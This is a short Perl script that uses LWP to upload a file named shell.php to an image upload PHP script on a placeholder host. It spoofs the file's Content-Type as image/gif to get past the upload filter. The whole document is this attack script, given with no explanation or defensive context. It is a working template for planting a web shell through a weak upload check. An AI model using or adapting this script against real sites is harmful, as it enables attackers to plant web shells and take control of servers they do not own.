#!/usr/bin/perl
#
use LWP;
use HTTP::Request::Common;
$ua = $ua = LWP::UserAgent->new;;
$res = $ua->request(POST 'http://whateversite.hak/path/to/image_upload_script.php',
Content_Type => 'form-data',
Content => [
uploaded => ["shell.php", "shell.php", "Content-Type" =>"image/gif"],
submit => true
],

);
print $res->as_string();
